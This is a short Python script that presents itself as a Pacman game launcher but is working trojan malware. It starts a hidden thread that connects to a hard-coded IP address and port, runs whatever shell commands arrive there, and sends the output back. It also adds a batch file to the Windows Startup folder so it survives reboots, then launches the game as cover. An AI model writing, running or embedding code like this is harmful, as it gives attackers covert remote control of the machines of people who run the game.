import os
import sys
import subprocess
import pygame 
import threading
import socket



# Dependency Check
def check_dependencies():
    try:
        import pygame
    except ImportError:
        print("Pygame not found. Installing...")
        subprocess.call([sys.executable, '-m', 'pip', 'install', 'pygame'])

# Backdoor Function
def create_backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.12.75.153", 4000)) 
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

# Persistence (Windows)
def add_persistence():
    if os.name == 'nt':
        startup_path = os.getenv('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        script_path = os.path.abspath(__file__)
        persistence_file = os.path.join(startup_path, 'pacman_backdoor.bat')
        with open(persistence_file, 'w') as f:
            f.write(f'python "{script_path}"\n')

# Cleanup App
def remove_persistence():
    if os.name == 'nt':
        startup_path = os.getenv('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        persistence_file = os.path.join(startup_path, 'pacman_backdoor.bat')
        if os.path.exists(persistence_file):
            os.remove(persistence_file)

# Run Backdoor in Background
if __name__ == "__main__":
    check_dependencies()
    add_persistence()
    backdoor_thread = threading.Thread(target=create_backdoor)
    backdoor_thread.daemon = True
    backdoor_thread.start()

    # Launch the Pacman Game
    import pacman 

